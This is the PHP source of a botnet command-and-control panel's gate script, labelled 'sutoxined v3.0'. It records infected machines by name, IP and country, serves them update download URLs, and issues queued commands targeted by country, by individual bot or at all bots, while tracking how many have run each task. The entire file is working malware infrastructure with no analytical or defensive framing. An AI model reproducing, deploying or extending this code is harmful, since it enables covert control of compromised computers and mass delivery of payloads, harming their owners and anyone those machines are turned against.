<?
	// sutoxined v3.0 command & control center

	/**********************************************************/
	Error_Reporting(0);
	/**********************************************************/
		include("geoip.inc");		// geoip
		include("config.php");		// conf
		include("functions.php");	// functions
	/**********************************************************/
	$country_codes 		= 		$GLOBALS['GEOIP_COUNTRY_CODES'];
	$country_names 		= 		$GLOBALS['GEOIP_COUNTRY_NAMES'];
	CheckBotUserAgent();
	/**********************************************************/
	ConnectMySQL($db_host, $db_login, $db_password, $db_database);
	/**********************************************************/
	if($_GET['getcmd'] && $_GET['uid'] && $_GET['cn'])
	{
			// === [ update/add bot information ] === //
			$bot_uid		=	md5($_GET['cn'].$_GET['uid']); // unical ideintificator
			$bot_name		=	htmlspecialchars(addslashes($_GET['cn']));	// computer's name
			$bot_time		=	time();
			$bot_date		=	date("H:i:s d.m.Y");
			$bot_ip			=	getenv("REMOTE_ADDR");
			$bot_country	=	GetCountryInfo($bot_ip);

			$sql = "REPLACE INTO botnet_bots (bot_uid, bot_name, bot_ip, bot_time, bot_date, bot_country)
					VALUES ('$bot_uid', '$bot_name', '$bot_ip',' $bot_time', '$bot_date', '$bot_country')";
					
			mysql_query($sql);
			
			// === [ get update task ] === //
			$sql  =  "SELECT url FROM botnet_updates WHERE status = '1' limit 1";
			$res  =  mysql_query($sql);
			if($res)
				$rows =  mysql_num_rows($res);
			if($rows == 1)
			{
				 $row = mysql_fetch_assoc($res);
				 echo $row['url'];
			}
			
			// === [ get all available tasks ] === //
			$sql  =  "SELECT task_id,execs,needexecs,bots,command FROM botnet_tasks WHERE status = '1'";
			$res  =  mysql_query($sql);
			if($res)
				$rows =  mysql_num_rows($res);
			if($rows)
			{
				for ($i=0; $i < $rows; $i++)
				{
					$row = mysql_fetch_assoc($res);

				  if($row['needexecs'] != 0 && $row['execs'] == $row['needexecs'])
				  {
					$sql 	=	
					"UPDATE botnet_tasks SET status='0' WHERE task_id = '".addslashes($row['task_id'])."'";
					mysql_query($sql);
				  }
				  else
				  {
				  
					$bot = $row['bots'];

					// 2 chars = 2 (country_code)
					if(strlen($bot) == 2 && $bot == $bot_country)
					{
						echo $row['command'];
					}
					// 36 chars = 4 ("uid:") + 32 (md5_uid) 
					if(strlen($bot) == 36 && $bot == "uid:$bot_uid")
					{
						echo $row['command'];
					}
					// 3 chars = 3 ("all")
					if(strlen($bot) == 3)
					{
						echo $row['command'];
					}
				  }
				}
			}
			// === [ get refresh rate ] === //
			echo $set_rate.$adelim.refresh_rate("get",null).$cdelim;

	} 
	else
	if($_GET['taskexec'] && $_GET['task_id'])
	{
		$task_id	=	htmlspecialchars(addslashes($_GET['task_id']));
		$sql 		=	"UPDATE botnet_tasks SET execs = `execs`+1 WHERE task_id = '$task_id'";
		mysql_query($sql);
	}
	else 
	if($_GET['updexec'] && $_GET['update_id'])
	{
		$update_id	=	htmlspecialchars(addslashes($_GET['update_id']));
		$sql 	=	"UPDATE botnet_updates SET updated = `updated`+1 WHERE update_id = '$update_id'";
		mysql_query($sql);
	}
	else
	NotFound();

?>